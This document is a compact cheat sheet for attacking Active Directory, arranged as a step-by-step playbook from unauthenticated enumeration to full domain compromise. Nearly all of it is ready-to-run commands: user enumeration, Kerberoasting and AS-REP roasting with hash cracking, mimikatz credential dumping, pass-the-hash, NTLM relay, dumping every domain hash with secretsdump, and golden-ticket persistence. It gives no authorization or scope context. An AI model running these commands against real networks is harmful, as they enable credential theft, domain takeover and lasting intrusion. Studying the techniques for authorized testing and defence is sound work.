# Quick Guide To AD Pentesting

## 1. Enumeration

Enumerate users, computers, groups, and AD misconfigurations.

### Basic Enumeration (No Credentials)

```bash
nmap -p 88,135,139,389,445,464,593,636,3268,3389 --script=ldap* --script=smb* <target>
smbclient -L //target -N
crackmapexec smb <target>
kerbrute userenum -d domain.com --dc <DC-IP> usernames.txt
```

### Detailed Enumeration (With Credentials)

```bash
bloodhound-python -u user -p pass -d domain.com -c All -dc-ip <DC-IP>
rpcclient -U 'user%pass' <DC-IP>
net group "Domain Admins" /domain
net user /domain
crackmapexec ldap <DC-IP> -u user -p pass --asreproast
```

If null SMB shares or weak accounts are identified, proceed to exploitation.

---

## 2. Exploitation (Privilege Escalation and Lateral Movement)

### Kerberoasting

```bash
GetUserSPNs.py -dc-ip <DC-IP> domain/user:pass -request
john --wordlist=rockyou.txt hash.txt
```

### AS-REP Roasting

```bash
GetNPUsers.py -dc-ip <DC-IP> -usersfile users.txt domain/ -format hashcat
hashcat -m 18200 hash.txt rockyou.txt --force
```

### Pass-the-Hash / Pass-the-Ticket

```bash
mimikatz.exe
sekurlsa::logonpasswords

psexec.py domain/user@target -hashes LM:NT
```

### NTLM Relay (If SMB Signing Is Disabled)

```bash
ntlmrelayx.py -t smb://target --smb2support
```

---

## 3. Full Domain Compromise

### Check for Domain Admin Privileges

```cmd
whoami /groups
net group "Domain Admins" /domain
```

### Dump AD Hashes (Domain Admin Required)

```bash
secretsdump.py -dc-ip <DC-IP> domain/admin:password@target
```

### Golden Ticket (Persistence)

```bash
mimikatz.exe
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt
```

---

## 4. Decision Flow

1. Do you have credentials?

   * No - start with unauthenticated enumeration.
   * Yes - use tools such as BloodHound and CrackMapExec.

2. Can you perform Kerberoasting or AS-REP Roasting?

   * Yes - extract and crack hashes.
   * No - focus on lateral movement.

3. Are SMB, LDAP, or Kerberos misconfigurations present?

   * Yes - use NTLM relay, pass-the-hash, or Kerberos attacks.
   * No - investigate local privilege escalation paths.

4. Do you have Domain Admin access?

   * Yes - dump hashes and establish persistence.
   * No - pivot to additional users or systems.
